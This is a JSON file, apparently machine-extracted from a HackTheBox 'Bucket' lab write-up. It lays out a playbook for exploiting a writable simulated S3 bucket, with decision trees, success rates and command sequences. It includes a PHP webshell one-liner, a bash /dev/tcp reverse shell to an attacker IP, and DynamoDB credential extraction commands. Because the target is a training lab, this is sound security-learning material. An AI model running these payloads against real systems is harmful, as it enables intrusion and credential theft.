@@ -1,0 +1,826 @@
+{
+  "writeup_id": "Htb_Bucket",
+  "scenario_fingerprint": {
+    "scenario_name": "aws_s3_bucket_misconfiguration",
+    "primary_services": [
+      "http",
+      "ssh",
+      "s3",
+      "dynamodb"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+http+s3_simulation",
+    "os_family": "linux",
+    "environment_type": "aws_simulation",
+    "entry_vector": "s3_bucket_upload",
+    "privilege_path": "webshell_to_database_access_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "unauthenticated_s3_write_access",
+      "virtual_host_routing",
+      "aws_headers_simulation",
+      "dynamodb_password_storage"
+    ],
+    "environmental_clues": [
+      "s3_subdomain_hosting",
+      "aws_amz_headers",
+      "hypercorn_server",
+      "localstack_simulation"
+    ],
+    "similar_scenarios": [
+      "cloud_storage_misconfigurations",
+      "aws_pentesting_labs"
+    ],
+    "unique_aspects": [
+      "htb_aws_simulation",
+      "pdf_generation_service",
+      "localhost_secondary_service"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "S3_bucket_misconfiguration",
+        "success_reason": "S3 bucket allowed unauthenticated read/write access with fake credentials",
+        "prerequisite_indicators": [
+          "s3_service_accessible",
+          "aws_headers_present",
+          "bucket_enumeration_possible"
+        ],
+        "recognition_patterns": [
+          "s3 subdomain exists",
+          "aws amz headers in responses",
+          "hypercorn-h11 server header",
+          "access-control-allow-* headers present"
+        ],
+        "failure_modes": [
+          "proper_authentication_required",
+          "bucket_permissions_locked_down",
+          "no_write_access_granted"
+        ],
+        "environmental_factors": [
+          "development_environment",
+          "default_s3_configuration",
+          "insufficient_access_controls"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "AWS_CLI_credential_bypass",
+        "success_reason": "Fake credentials accepted due to misconfigured authentication",
+        "prerequisite_indicators": [
+          "aws_service_simulation",
+          "credential_validation_disabled",
+          "anonymous_access_allowed"
+        ],
+        "recognition_patterns": [
+          "aws configure accepts any values",
+          "bogus credentials work for enumeration",
+          "localstack or similar simulation"
+        ],
+        "failure_modes": [
+          "real_aws_credential_validation",
+          "proper_iam_policies_enforced",
+          "authentication_required"
+        ],
+        "environmental_factors": [
+          "testing_environment",
+          "aws_simulation_software",
+          "development_misconfiguration"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "s3.bucket.htb subdomain",
+        "discovery_method": "HTML source analysis and subdomain enumeration",
+        "why_critical": "Revealed AWS S3 service simulation with write access",
+        "how_to_recognize": [
+          "image sources pointing to s3 subdomain",
+          "aws amz headers in responses",
+          "bucket-style URL patterns"
+        ],
+        "follow_up_actions": [
+          "test_aws_cli_access",
+          "enumerate_buckets",
+          "test_upload_permissions"
+        ]
+      },
+      {
+        "discovery": "writable adserver bucket",
+        "discovery_method": "aws s3 ls and cp commands with fake credentials",
+        "why_critical": "Allows file upload for webshell deployment",
+        "how_to_recognize": [
+          "aws s3 ls returns bucket contents",
+          "cp command succeeds with test file",
+          "website files stored in same bucket"
+        ],
+        "follow_up_actions": [
+          "upload_webshell",
+          "test_code_execution",
+          "enumerate_other_services"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated",
+        "escalation_method": "S3_bucket_write_to_webshell",
+        "why_possible": "Website files served from writable S3 bucket",
+        "recognition_signs": [
+          "website_images_from_s3",
+          "index.html_in_bucket",
+          "write_permissions_granted"
+        ],
+        "exploitation_path": "S3 write access → webshell upload → code execution"
+      },
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "DynamoDB_password_reuse",
+        "why_possible": "DynamoDB accessible with credentials reused for system user",
+        "recognition_signs": [
+          "dynamodb_service_running",
+          "password_tables_accessible",
+          "credential_reuse_patterns"
+        ],
+        "exploitation_path": "DynamoDB access → password extraction → user privilege escalation"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with redirect to bucket.htb",
+        "decision": "Enumerate virtual hosts and check for cloud service simulation",
+        "reasoning": "Hostname suggests AWS S3 bucket simulation, redirect indicates vhost usage",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if vhost enum fails"
+          },
+          {
+            "option": "standard_web_enum",
+            "when": "if no cloud indicators"
+          }
+        ],
+        "success_indicators": [
+          "s3_subdomain_found",
+          "aws_headers_present",
+          "bucket_structure_identified"
+        ],
+        "next_decision": "test_s3_bucket_permissions"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered s3.bucket.htb with AWS-like headers and bucket structure",
+        "decision": "Test for anonymous S3 bucket access with fake credentials",
+        "reasoning": "Misconfigured S3 buckets often allow anonymous access if any credentials provided",
+        "confidence": 0.85,
+        "prerequisites": [
+          "aws_cli_available",
+          "s3_endpoint_identified"
+        ],
+        "success_indicators": [
+          "bucket_listing_successful",
+          "read_access_confirmed"
+        ],
+        "failure_fallbacks": [
+          "credential_bruteforce",
+          "other_aws_services",
+          "web_exploitation"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Confirmed read/write access to S3 bucket hosting website files",
+        "decision": "Test file upload capabilities and execution permissions",
+        "reasoning": "If bucket hosts website and allows uploads, may achieve code execution",
+        "confidence": 0.95,
+        "prerequisites": [
+          "s3_write_access",
+          "website_hosted_from_bucket"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "web_accessible_files"
+        ],
+        "next_decision": "determine_executable_file_types"
+      },
+      {
+        "step": 4,
+        "situation": "Confirmed file upload and web access, testing execution",
+        "decision": "Upload PHP webshell after confirming PHP execution",
+        "reasoning": "Apache server likely processes PHP files uploaded to bucket",
+        "confidence": 0.9,
+        "prerequisites": [
+          "file_upload_working",
+          "php_files_accessible"
+        ],
+        "success_indicators": [
+          "command_execution_achieved"
+        ],
+        "next_decision": "establish_reverse_shell"
+      }
+    ],
+    "branching_logic": {
+      "if_s3_access_succeeds": {
+        "action": "enumerate_bucket_contents_and_test_uploads",
+        "tools": [
+          "aws-cli",
+          "curl"
+        ],
+        "next_phase": "test_code_execution"
+      },
+      "if_s3_access_fails": {
+        "action": "try_alternative_cloud_services",
+        "alternatives": [
+          "dynamodb",
+          "ec2_metadata",
+          "lambda"
+        ],
+        "decision_criteria": "based_on_service_headers_found"
+      },
+      "if_webshell_succeeds": {
+        "action": "establish_persistent_shell",
+        "purpose": "maintain_access_despite_cleanup_scripts",
+        "tools": [
+          "bash_reverse_shell",
+          "nc"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_test_anonymous_s3_access_with_fake_creds",
+        "reasoning": "misconfigured_buckets_common_and_high_impact",
+        "applicability": "aws_s3_services_detected"
+      },
+      {
+        "rule": "test_multiple_file_extensions_for_execution",
+        "reasoning": "different_extensions_may_have_different_processing_rules",
+        "applicability": "file_upload_capability_confirmed"
+      },
+      {
+        "rule": "expect_cleanup_automation_in_cloud_environments",
+        "reasoning": "cloud_services_often_have_automated_maintenance",
+        "applicability": "cloud_service_exploitation"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "S3_Bucket_Misconfiguration",
+        "mitre_id": "T1530",
+        "required_services": [
+          "http",
+          "s3"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "s3_service_detected",
+          "aws_headers_present",
+          "bucket_publicly_accessible"
+        ],
+        "success_indicators": [
+          "unauthenticated_bucket_access",
+          "file_upload_successful",
+          "aws_cli_commands_work"
+        ],
+        "incompatible_with": [
+          "bucket_authentication_required",
+          "strict_bucket_policies",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "amz_headers_in_response",
+          "s3_subdomain_pattern",
+          "bucket_name_in_url_structure"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Web_Shell_Upload",
+        "mitre_id": "T1505.003",
+        "required_services": [
+          "http"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_capability",
+          "web_server_executes_uploaded_files",
+          "writable_web_directory"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "uploaded_file_accessible_via_web",
+          "code_execution_achieved"
+        ],
+        "incompatible_with": [
+          "file_upload_disabled",
+          "execution_restrictions",
+          "file_type_filtering"
+        ],
+        "confidence_boosters": [
+          "php_server_detected",
+          "unrestricted_upload_directory",
+          "no_file_extension_filtering"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "DynamoDB_Enumeration",
+        "mitre_id": "T1552.001",
+        "required_services": [
+          "dynamodb",
+          "aws"
+        ],
+        "required_ports": [
+          8000,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "dynamodb_service_accessible",
+          "aws_credentials_available",
+          "database_contains_sensitive_data"
+        ],
+        "success_indicators": [
+          "database_tables_enumerated",
+          "sensitive_data_extracted",
+          "credentials_found"
+        ],
+        "incompatible_with": [
+          "dynamodb_authentication_required",
+          "network_isolation",
+          "encrypted_database"
+        ],
+        "confidence_boosters": [
+          "aws_environment_detected",
+          "default_dynamodb_configuration",
+          "development_environment"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "15-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "aws_s3_service": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "s3"
+        ],
+        "banner_indicators": [
+          "hypercorn",
+          "s3"
+        ],
+        "header_indicators": [
+          "x-amz-",
+          "access-control-allow-methods"
+        ],
+        "url_patterns": [
+          "s3.*.*/",
+          "*/bucket/"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "aws_environment": {
+        "service_indicators": [
+          "s3",
+          "dynamodb"
+        ],
+        "header_indicators": [
+          "x-amz-",
+          "x-localstack"
+        ],
+        "subdomain_patterns": [
+          "s3.",
+          "*.amazonaws.com"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "s3_bucket_enumeration",
+          "when": "s3_service_detected",
+          "reason": "often_misconfigured_allows_unauthenticated_access"
+        },
+        {
+          "attack": "web_shell_upload_via_s3",
+          "when": "s3_bucket_writable_and_web_accessible",
+          "reason": "direct_path_to_code_execution"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "aws_service_enumeration",
+          "when": "aws_environment_detected",
+          "reason": "may_reveal_additional_services_and_misconfigurations"
+        },
+        {
+          "attack": "dynamodb_enumeration",
+          "when": "aws_credentials_obtained",
+          "reason": "databases_often_contain_sensitive_information"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "ssh_bruteforce",
+          "when": "ssh_service_detected",
+          "reason": "time_consuming_low_success_rate_without_usernames"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "S3 Bucket Misconfiguration Exploitation",
+        "mitre_id": "T1530",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "aws cli",
+            "command_template": "aws s3 --endpoint-url http://{s3_host} ls s3://{bucket_name}",
+            "actual_command": "aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver",
+            "output_pattern": "bucket contents listing",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "aws s3 cp",
+            "command_template": "aws s3 --endpoint-url http://{s3_host} cp {local_file} s3://{bucket_name}/{remote_file}",
+            "actual_command": "aws s3 --endpoint-url http://s3.bucket.htb cp /opt/shells/php/cmd.php s3://adserver/",
+            "success_factors": [
+              "write_permissions_enabled",
+              "web_execution_enabled"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "s3_service_accessible",
+          "bucket_allows_anonymous_access",
+          "web_server_serves_s3_content"
+        ],
+        "success_indicators": [
+          "bucket_listing_successful",
+          "file_upload_successful",
+          "uploaded_file_accessible_via_web"
+        ],
+        "common_failures": [
+          "authentication_required",
+          "write_permissions_denied",
+          "file_type_restrictions"
+        ],
+        "follow_up_techniques": [
+          "webshell_upload",
+          "reverse_shell_execution"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "PHP Webshell Upload and Execution",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "php webshell",
+            "command_template": "<?php system($_REQUEST[\"cmd\"]); ?>",
+            "actual_command": "curl http://bucket.htb/cmd.php?cmd=id",
+            "output_pattern": "command execution output",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "bash reverse shell",
+            "command_template": "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
+            "actual_command": "curl http://bucket.htb/cmd.php --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.14/443 0>&1'\"",
+            "success_factors": [
+              "outbound_connections_allowed",
+              "bash_available"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "file_upload_capability",
+          "php_execution_enabled",
+          "web_accessible_upload_location"
+        ],
+        "success_indicators": [
+          "webshell_responds_to_commands",
+          "reverse_shell_connection_established"
+        ],
+        "common_failures": [
+          "php_execution_disabled",
+          "file_type_filtering",
+          "outbound_connections_blocked"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "lateral_movement",
+          "persistence_establishment"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "DynamoDB Enumeration",
+        "mitre_id": "T1580",
+        "category": "discovery",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "aws dynamodb",
+            "command_template": "aws --endpoint-url http://127.0.0.1:4566 dynamodb list-tables --region {region}",
+            "actual_command": "aws --endpoint-url http://127.0.0.1:4566 dynamodb list-tables --region us-east-1",
+            "output_pattern": "table names in json format",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "aws dynamodb scan",
+            "command_template": "aws --endpoint-url http://127.0.0.1:4566 dynamodb scan --table-name {table} --region {region}",
+            "actual_command": "aws --endpoint-url http://127.0.0.1:4566 dynamodb scan --table-name users --region us-east-1",
+            "success_factors": [
+              "table_exists",
+              "read_permissions"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "aws_cli_available",
+          "dynamodb_service_accessible",
+          "valid_region_specified"
+        ],
+        "success_indicators": [
+          "tables_listed_successfully",
+          "table_data_retrieved",
+          "credentials_or_sensitive_data_found"
+        ],
+        "common_failures": [
+          "authentication_required",
+          "incorrect_region",
+          "service_not_accessible"
+        ],
+        "follow_up_techniques": [
+          "credential_reuse_testing",
+          "password_spraying",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "aws cli",
+        "use_case": "s3_bucket_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "aws_cloud_environments"
+        ],
+        "alternatives": [
+          "curl",
+          "boto3_scripts"
+        ],
+        "best_practices": [
+          "use_fake_credentials_for_anonymous_access_testing",
+          "specify_endpoint_url_for_non_aws_implementations",
+          "test_both_read_and_write_permissions"
+        ]
+      },
+      {
+        "tool": "nmap",
+        "use_case": "initial_reconnaissance",
+        "effectiveness_rating": 4,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "network_reconnaissance"
+        ],
+        "alternatives": [
+          "masscan",
+          "rustscan"
+        ],
+        "best_practices": [
+          "use_min_rate_for_faster_scanning",
+          "follow_up_with_service_detection",
+          "check_for_redirects_in_http_services"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "s3_bucket_to_webshell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "aws configure",
+            "purpose": "Set fake credentials for anonymous access testing",
+            "expected_output": "Configuration prompts"
+          },
+          {
+            "step": 2,
+            "command": "aws s3 --endpoint-url http://s3.bucket.htb ls",
+            "purpose": "List available buckets",
+            "expected_output": "Bucket names and timestamps"
+          },
+          {
+            "step": 3,
+            "command": "aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver",
+            "purpose": "List bucket contents",
+            "expected_output": "Files and directories in bucket"
+          },
+          {
+            "step": 4,
+            "command": "aws s3 --endpoint-url http://s3.bucket.htb cp cmd.php s3://adserver/",
+            "purpose": "Upload PHP webshell",
+            "expected_output": "Upload confirmation"
+          },
+          {
+            "step": 5,
+            "command": "curl http://bucket.htb/cmd.php?cmd=id",
+            "purpose": "Test webshell execution",
+            "expected_output": "User ID information"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-25 minutes"
+      },
+      {
+        "sequence_name": "dynamodb_credential_extraction",
+        "steps": [
+          {
+            "step": 1,
+            "command": "aws --endpoint-url http://127.0.0.1:4566 dynamodb list-tables --region us-east-1",
+            "purpose": "Enumerate DynamoDB tables",
+            "expected_output": "List of table names"
+          },
+          {
+            "step": 2,
+            "command": "aws --endpoint-url http://127.0.0.1:4566 dynamodb scan --table-name users --region us-east-1",
+            "purpose": "Extract user data from table",
+            "expected_output": "User records with potential passwords"
+          },
+          {
+            "step": 3,
+            "command": "su - roy",
+            "purpose": "Test extracted credentials",
+            "expected_output": "Successful user switch"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "10-20 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Bucket",
+      "difficulty": "Medium",
+      "os": "Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2020-10-17",
+      "author": "MrR3boot",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "s3_bucket_misconfiguration",
+        "dynamodb_access",
+        "pdf_generation_exploit"
+      ],
+      "key_vulnerabilities": [
+        "unauthenticated_s3_write",
+        "password_reuse",
+        "file_read_via_pdf_service"
+      ],
+      "environment_type": "aws_cloud_simulation",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "aws_security",
+        "s3_exploitation",
+        "dynamodb_enumeration",
+        "pdf_service_attacks"
+      ],
+      "prerequisite_knowledge": [
+        "aws_basics",
+        "s3_concepts",
+        "web_exploitation",
+        "linux_fundamentals"
+      ]
+    },
+    "categorization": {
+      "primary_category": "cloud_security",
+      "subcategories": [
+        "aws_exploitation",
+        "web_application",
+        "privilege_escalation"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "s3_bucket_hardening",
+        "proper_aws_iam",
+        "secure_pdf_generation",
+        "password_policies"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Tabby",
+        "Jewel",
+        "Ready"
+      ],
+      "similarity_reasons": [
+        "cloud_services",
+        "web_exploitation",
+        "service_misconfiguration"
+      ],
+      "unique_aspects": [
+        "aws_stack_simulation",
+        "dynamodb_interaction",
+        "pdf_service_exploitation"
+      ],
+      "difficulty_factors": [
+        "aws_knowledge_required",
+        "multiple_service_interaction",
+        "file_read_to_shell_conversion"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T22:53:45.503801",
+    "original_file": "0xdf_writeups/Htb Bucket.md",
+    "content_length": 37248,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
